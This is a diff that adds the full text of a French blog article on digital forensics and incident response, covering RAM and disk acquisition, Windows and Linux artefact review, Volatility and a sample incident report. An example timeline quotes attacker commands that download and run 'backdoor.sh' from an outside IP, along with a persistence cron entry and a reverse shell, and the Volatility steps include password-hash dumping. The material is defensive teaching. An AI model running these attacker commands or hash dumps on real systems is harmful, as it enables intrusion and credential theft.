@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Forensics numérique : investigation après un incident — Temgus.CyberBlog</title>
 <meta name="description" content="Acquisition de preuves, analyse RAM avec Volatility, timeline et rapport d'investigation.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/forensics-numerique.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/forensics-numerique.html">
 <meta property="og:title" content="Forensics numérique : investigation après un incident — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Forensics numérique : investigation après un incident — Temgus.CyberBlog">
 <meta name="twitter:description" content="Acquisition de preuves, analyse RAM avec Volatility, timeline et rapport d'investigation.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,539 @@
   "headline": "Forensics numérique : investigation après un incident",
   "description": "Acquisition de preuves, analyse RAM avec Volatility, timeline et rapport d'investigation.",
   "datePublished": "2025-06-02",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/forensics-numerique.html",
   "inLanguage": "fr",
   "keywords": "forensics, Volatility, investigation, DFIR",
-  "timeRequired": "PT12M"
+  "timeRequired": "PT12M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🔬</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Forensics numérique : investigation après un incident</h1>
-  <p style="color:#8892a4;max-width:500px">Acquisition de preuves, analyse RAM avec Volatility, timeline et rapport d'investigation.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#forensics-numerique" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🔬</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Forensics numérique : investigation après un incident</div>
+      <div class="meta-details">
+        <span>📅 2025-06-02</span>
+        <span>⏱ 12 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#les-principes-fondamentaux">Les principes fondamentaux</a></li>
+<li><a href="#acquisition-de-preuves">Acquisition de preuves</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#m-moire-ram-volatile-">Mémoire RAM (volatile)</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#image-disque">Image disque</a></li>
+<li><a href="#analyse-forensique-linux">Analyse forensique Linux</a></li>
+<li><a href="#analyse-forensique-windows">Analyse forensique Windows</a></li>
+<li><a href="#volatility-analyse-m-moire-avanc-e">Volatility — Analyse mémoire avancée</a></li>
+<li><a href="#timeline-forensique">Timeline forensique</a></li>
+<li><a href="#rapport-d-investigation">Rapport d'investigation</a></li>
+<li><a href="#r-sum-ex-cutif">Résumé Exécutif</a></li>
+<li><a href="#chronologie-de-l-incident">Chronologie de l'incident</a></li>
+<li><a href="#vecteur-d-attaque-initial">Vecteur d'attaque initial</a></li>
+<li><a href="#actions-de-l-attaquant">Actions de l'attaquant</a></li>
+<li><a href="#indicateurs-de-compromission-iocs-">Indicateurs de Compromission (IoCs)</a></li>
+<li><a href="#recommandations">Recommandations</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Forensics numérique : investigation après un incident</h1>
+
+<p>La forensique numérique est l'art de <strong>collecter, préserver et analyser</strong> des preuves numériques après un incident de sécurité. Que ce soit pour comprendre comment un attaquant est entré, ce qu'il a fait, ou pour préparer une action légale, le forensics suit une méthodologie rigoureuse.</p>
+
+<h2 id="les-principes-fondamentaux">Les principes fondamentaux</h2>
+
+<pre><code>Règle d'or : PRÉSERVER AVANT D'ANALYSER
+
+<p>Ne jamais modifier les preuves originales :</p>
+<p>✅ Travailler sur des copies (images disque)</p>
+<p>✅ Calculer les hashes AVANT toute analyse (intégrité)</p>
+<p>✅ Documenter chaque action avec horodatage</p>
+<p>✅ Maintenir la chaîne de custody</p>
+
+<p>Ordre de volatilité (collecter du plus volatile au moins volatile) :</p>
+<li>Registres CPU et cache               (perdus à l'extinction)</li>
+<li>Mémoire RAM                          (perdue à l'extinction)</li>
+<li>Trafic réseau                        (volatile)</li>
+<li>Processus en cours                   (volatile)</li>
+<li>Connexions réseau actives            (volatile)</li>
+<li>Fichiers temporaires                 (semi-volatile)</li>
+<li>Disque dur                           (persistant)</li>
+<li>Logs distants / sauvegardes          (persistant)</code></pre></li>
+
+<h2 id="acquisition-de-preuves">Acquisition de preuves</h2>
+
+<h3 id="m-moire-ram-volatile-">Mémoire RAM (volatile)</h3>
+
+<pre><code class="language-bash"># Linux - Acquisition de la RAM avec LiME (Linux Memory Extractor)
+<h1>Sur la machine suspecte (si encore accessible) :</h1>
+<p>sudo insmod lime.ko "path=/external/ram.lime format=lime"</p>
+
+<h1>Windows - Winpmem</h1>
+<p>winpmem.exe ram_dump.raw</p>
+
+<h1>Analyser avec Volatility 3</h1>
+<p>vol3 -f ram.lime linux.pslist     # Liste des processus</p>
+<p>vol3 -f ram.lime linux.netstat    # Connexions réseau actives</p>
+<p>vol3 -f ram.lime linux.bash       # Historique bash en mémoire</p>
+<p>vol3 -f ram.lime linux.malfind    # Code injecté suspect</p>
+
+<h1>Windows RAM analysis</h1>
+<p>vol3 -f ram.raw windows.pslist</p>
+<p>vol3 -f ram.raw windows.cmdline    # Arguments des processus</p>
+<p>vol3 -f ram.raw windows.netscan    # Connexions réseau</p>
+<p>vol3 -f ram.raw windows.malfind    # Processus/DLL suspects</p>
+<p>vol3 -f ram.raw windows.dumpfiles  # Extraire les fichiers en mémoire</p>
+<p>vol3 -f ram.raw windows.hashdump   # Hashes des mots de passe</code></pre>
+
+<h3 id="image-disque">Image disque</h3>
+
+<pre><code class="language-bash"># Créer une image disque avec dd (préserver les preuves)
+<h1>Calculer le hash AVANT</h1>
+<p>sha256sum /dev/sda &gt; hash_before.txt</p>
+
+<h1>Créer l'image (bit-for-bit copy)</h1>
+<p>dd if=/dev/sda of=/external/disk_image.img bs=4M conv=noerror,sync status=progress</p>
+
+<h1>Alternative plus rapide avec dcfldd</h1>
+<p>dcfldd if=/dev/sda of=/external/disk_image.img hash=sha256 hashlog=hash.log</p>
+
+<h1>Vérifier l'intégrité de l'image</h1>
+<p>sha256sum /external/disk_image.img &gt; hash_after.txt</p>
+<p>diff hash_before.txt hash_after.txt  # Doit être identique</p>
+
+<h1>FTK Imager (Windows) - Interface graphique professionnelle</h1>
+<h1>Autopsy - Plateforme d'analyse forensique open source</code></pre></h1>
+
+<h2 id="analyse-forensique-linux">Analyse forensique Linux</h2>
+
+<pre><code class="language-bash"># Timeline d'activité des fichiers
+<h1>Mactime : MAC times (Modified, Accessed, Changed)</h1>
+<p>find /  -printf "%T@ %p\n" 2&gt;/dev/null | sort -n | \</p>
+<p>awk '{print strftime("%Y-%m-%d %H:%M:%S", $1), $2}' | \</p>
+<p>grep "2024-04" &gt; activity_april_2024.txt</p>
+
+<h1>Fichiers modifiés récemment (30 derniers jours)</h1>
+<p>find / -mtime -30 -type f 2&gt;/dev/null | grep -v /proc | grep -v /sys</p>
+
+<h1>Fichiers supprimés mais récupérables avec PhotoRec/TestDisk</h1>
+<p>photorec /log /d recovered_files/ disk_image.img</p>
+
+<h1>Analyse des logs système</h1>
+<h1>Quand le système a-t-il été compromis ?</h1>
+<p>last -F | head -20          # Dernières connexions</p>
+<p>lastb -F | head -20         # Tentatives échouées</p>
+<p>who -a                      # Utilisateurs actuellement connectés</p>
+<p>cat /var/log/auth.log | grep "Accepted\|Failed" | tail -100</p>
+
+<h1>Fichiers SUID/SGID modifiés récemment (possible backdoor)</h1>
+<p>find / -perm -4000 -mtime -7 2&gt;/dev/null</p>
+
+<h1>Crontabs (persistence possible)</h1>
+<p>for user in $(cut -f1 -d: /etc/passwd); do</p>
+<p>crontab -u $user -l 2&gt;/dev/null | grep -v "^#" | grep -v "^$"</p>
+<p>done</p>
+<p>cat /etc/crontab /etc/cron.d/*</p>
+
+<h1>Connexions réseau actives au moment de l'incident</h1>
+<p>ss -antp</p>
+<p>netstat -antp</p>
+<p>lsof -i</p>
+
+<h1>Historique bash de tous les utilisateurs</h1>
+<p>cat /root/.bash_history</p>
+<p>for user in /home/*; do cat $user/.bash_history 2&gt;/dev/null; done</code></pre>
+
+<h2 id="analyse-forensique-windows">Analyse forensique Windows</h2>
+
+<pre><code class="language-powershell"># Artefacts Windows clés pour l'investigation
+
+<h1>1. Event Logs (journaux d'événements)</h1>
+<p>Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4648,4672,4720,4728} |</p>
+<p>Select-Object TimeCreated, Id, Message |</p>
+<p>Export-Csv "security_events.csv"</p>
+
+<h1>2. Prefetch (traces d'exécution de programmes)</h1>
+<h1>C:\Windows\Prefetch\*.pf</h1>
+<h1>Contient : nom du programme, nombre d'exécutions, dernière exécution</h1>
+<p>Get-ChildItem C:\Windows\Prefetch | Sort-Object LastWriteTime -Descending | Select-Object -First 20</p>
+
+<h1>3. Registry (persistence et traces)</h1>
+<h1>Clés de démarrage</h1>
+<p>Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</p>
+<p>Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</p>
+
+<h1>Programmes récemment utilisés</h1>
+<p>Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"</p>
+
+<h1>4. LNK Files (fichiers raccourci - traces d'accès)</h1>
+<p>Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" |</p>
+<p>Select-Object Name, CreationTime, LastWriteTime |</p>
+<p>Sort-Object LastWriteTime -Descending</p>
+
+<h1>5. Browser History</h1>
+<h1>Chrome : $APPDATA\Google\Chrome\User Data\Default\History (SQLite)</h1>
+<p>$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"</p>
+<p>Copy-Item $chromePath "chrome_history_copy.db"</p>
+<h1>Analyser avec DB Browser for SQLite</h1>
+
+<h1>6. Amcache (traces d'exécution)</h1>
+<h1>C:\Windows\AppCompat\Programs\Amcache.hve</h1>
+<h1>Contient hash SHA1 de chaque exécutable lancé</h1>
+
+<h1>7. Windows Timeline</h1>
+<h1>C:\Users\[user]\AppData\Local\ConnectedDevicesPlatform\</h1>
+<h1>Base de données SQLite avec activité utilisateur</code></pre></h1>
+
+<h2 id="volatility-analyse-m-moire-avanc-e">Volatility — Analyse mémoire avancée</h2>
+
+<pre><code class="language-bash"># Identifier le profil (Volatility 2)
+<p>volatility -f memory.dmp imageinfo</p>
+
+<h1>Lister tous les processus avec arbre parent-enfant</h1>
+<p>volatility -f memory.dmp --profile=Win10x64 pstree</p>
+
+<h1>Détecter les processus avec injection de code</h1>
+<p>volatility -f memory.dmp --profile=Win10x64 malfind</p>
+
+<h1>Extraire un processus suspect pour analyse statique</h1>
+<p>volatility -f memory.dmp --profile=Win10x64 procdump -p 1234 --dump-dir=./dumps/</p>
+
+<h1>Connexions réseau au moment du dump</h1>
+<p>volatility -f memory.dmp --profile=Win10x64 netscan</p>
+
+<h1>Analyser les DLLs chargées par un processus</h1>
+<p>volatility -f memory.dmp --profile=Win10x64 dlllist -p 1234</p>
+
+<h1>Hives de registre en mémoire</h1>
+<p>volatility -f memory.dmp --profile=Win10x64 hivelist</p>
+<p>volatility -f memory.dmp --profile=Win10x64 printkey -K "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</p>
+
+<h1>Hashs des mots de passe</h1>
+<p>volatility -f memory.dmp --profile=Win10x64 hashdump</code></pre>
+
+<h2 id="timeline-forensique">Timeline forensique</h2>
+
+<pre><code class="language-python"># Créer une timeline complète de l'incident
+
+<p>import pandas as pd</p>
+<p>from datetime import datetime</p>
+
+<p>def creer_timeline(logs_dict):</p>
+<p>events = []</p>
+
+<p># Windows Event Logs</p>
+<p>for event in logs_dict.get('windows_events', []):</p>
+<p>events.append({</p>
+<p>'timestamp': event['TimeCreated'],</p>
+<p>'source': 'Windows Event Log',</p>
+<p>'event_id': event['Id'],</p>
+<p>'description': event['Message'][:200]</p>
+<p>})</p>
+
+<p># Syslog Linux</p>
+<p>for line in logs_dict.get('syslog', []):</p>
+<p>events.append({</p>
+<p>'timestamp': parse_syslog_date(line),</p>
+<p>'source': 'Syslog',</p>
+<p>'description': line</p>
+<p>})</p>
+
+<p># Trier par timestamp</p>
+<p>timeline = pd.DataFrame(events)</p>
+<p>timeline.sort_values('timestamp', inplace=True)</p>
+
+<p>return timeline</p>
+
+<h1>Exemple de timeline d'incident</h1>
+<p>"""</p>
+<p>2024-04-15 08:23:11 | Auth Log     | Failed password for root from 185.220.101.5</p>
+<p>2024-04-15 08:23:45 | Auth Log     | Failed password for admin from 185.220.101.5</p>
+<p>2024-04-15 08:24:02 | Auth Log     | Accepted password for www-data from 185.220.101.5</p>
+<p>2024-04-15 08:24:15 | Bash History | wget http://185.220.101.5/backdoor.sh</p>
+<p>2024-04-15 08:24:17 | Bash History | chmod +x backdoor.sh &amp;&amp; ./backdoor.sh</p>
+<p>2024-04-15 08:24:18 | Crontab      | <em>/5 </em> <em> </em> * /tmp/.hidden/persist.sh</p>
+<p>2024-04-15 08:25:00 | Netstat      | TCP ESTABLISHED 185.220.101.5:4444 (reverse shell)</p>
+<p>"""</code></pre>
+
+<h2 id="rapport-d-investigation">Rapport d'investigation</h2>
+
+<pre><code class="language-markdown"># Rapport d'Investigation Forensique
+
+<h2 id="r-sum-ex-cutif">Résumé Exécutif</h2>
+<ul><li>Date de l'incident : 15 avril 2024, 08:24</li><li>Systèmes affectés : Serveur Web prod-web-01</li><li>Impact : Accès non autorisé, installation de backdoor</li><li>Données potentiellement compromises : Base de données clients</li></ul>
+
+<h2 id="chronologie-de-l-incident">Chronologie de l'incident</h2>
+<p>[Timeline détaillée]</p>
+
+<h2 id="vecteur-d-attaque-initial">Vecteur d'attaque initial</h2>
+<p>Brute force sur SSH → Mot de passe faible du compte www-data</p>
+
+<h2 id="actions-de-l-attaquant">Actions de l'attaquant</h2>
+<li>Connexion SSH via mot de passe brute-force</li>
+<li>Téléchargement d'un backdoor depuis 185.220.101.5</li>
+<li>Installation d'une tâche cron persistante</li>
+<li>Établissement d'un reverse shell</li>
+
+<h2 id="indicateurs-de-compromission-iocs-">Indicateurs de Compromission (IoCs)</h2>
+<ul><li>IP attaquante : 185.220.101.5</li><li>Fichier malveillant : /tmp/.hidden/persist.sh</li></ul>
+<p>SHA256 : a1b2c3d4e5f6...</p>
+<ul><li>Crontab malicieux : <em>/5 </em> <em> </em> * /tmp/.hidden/persist.sh</li></ul>
+
+<h2 id="recommandations">Recommandations</h2>
+<li>Désactiver l'authentification par mot de passe SSH</li>
+<li>Activer fail2ban</li>
+<li>Réinitialiser tous les mots de passe</li>
+<li>Appliquer les mises à jour en attente</code></pre></li>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>La forensique numérique est une discipline qui demande <strong>rigueur, méthode et rapidité</strong>. La collecte dans l'ordre de volatilité, la préservation des preuves et la documentation exhaustive sont non-négociables. Des outils comme <strong>Autopsy, Volatility et The Sleuth Kit</strong> permettent d'analyser des incidents complexes même sans budget commercial.</p></article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#forensics-numerique" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/email-spoofing-spf-dkim.html" class="nav-prev">← Email spoofing et SPF/DKIM/DMARC : sécuriser votre messagerie</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/ransomware-anatomie.html" class="nav-next">Ransomware : anatomie d'une attaque moderne →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
